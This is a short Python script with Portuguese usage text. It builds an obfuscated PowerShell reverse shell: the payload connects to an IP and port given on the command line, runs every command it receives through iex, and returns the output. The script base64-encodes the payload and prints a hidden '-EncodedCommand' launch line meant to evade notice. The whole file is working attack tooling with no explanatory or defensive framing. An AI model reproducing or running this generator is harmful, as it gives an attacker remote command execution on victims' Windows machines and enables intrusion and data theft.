import sys
import base64
if len(sys.argv) != 3:
    print("Uso: python script.py <endereco_IP> <porta>")
    sys.exit(1)

ip = sys.argv[1]
porta = sys.argv[2]

payload = f'$client = New-Object System.Net.Sockets.TCPClient("{ip}",{porta});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'

cmd = "powershell -nop -w hidden -EncodedCommand " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
